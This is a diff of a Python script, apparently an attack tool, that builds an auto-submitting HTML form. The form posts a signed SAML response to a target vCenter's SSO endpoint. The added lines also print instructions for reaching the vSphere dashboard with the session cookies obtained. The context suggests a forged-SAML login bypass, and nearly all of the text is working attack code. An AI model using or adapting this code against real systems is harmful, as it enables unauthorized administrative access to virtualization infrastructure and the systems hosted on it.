@@ -2040,26 +2040,22 @@ def main():
             import tempfile
             saml_b64 = base64.b64encode(signed).decode()
             html = (
-                '<!DOCTYPE html><html><head></head><body>\n'
-                '<p>Logging in to vCenter...</p>\n'
-                '<iframe name="saml" style="display:none"></iframe>\n'
-                f'<form id="f" method="POST" action="https://{target}/ui/saml/websso/sso" target="saml">\n'
+                '<!DOCTYPE html><html>\n'
+                f'<body onload="document.forms[0].submit()">\n'
+                f'<form method="POST" action="https://{target}/ui/saml/websso/sso">\n'
                 f'  <input type="hidden" name="SAMLResponse" value="{saml_b64}"/>\n'
                 f'  <input type="hidden" name="RelayState" value="{relay_state}"/>\n'
                 '</form>\n'
-                '<script>\n'
-                'var iframe = document.querySelector("iframe");\n'
-                'var ready = false;\n'
-                f'iframe.onload = function() {{ if (ready) window.location.href = "https://{target}/ui/"; }};\n'
-                'ready = true;\n'
-                'document.getElementById("f").submit();\n'
-                '</script>\n'
+                '<p>Submitting SSO login...</p>\n'
                 '</body></html>'
             )
             out = Path(tempfile.gettempdir()) / 'vcenter_saml_login.html'
             out.write_text(html)
             print(f'\n[+] Open in browser (act fast — SSO request expires in ~2 min):')
             print(f'    file://{out}')
+            print(f'\n    When the page goes blank, navigate to:')
+            print(f'    https://{target}/ui/')
+            print(f'    (cookies are already set — you will land on the vSphere dashboard)')
             return
 
         cname, cval, ui_session = saml_login(target, signed, relay_state)
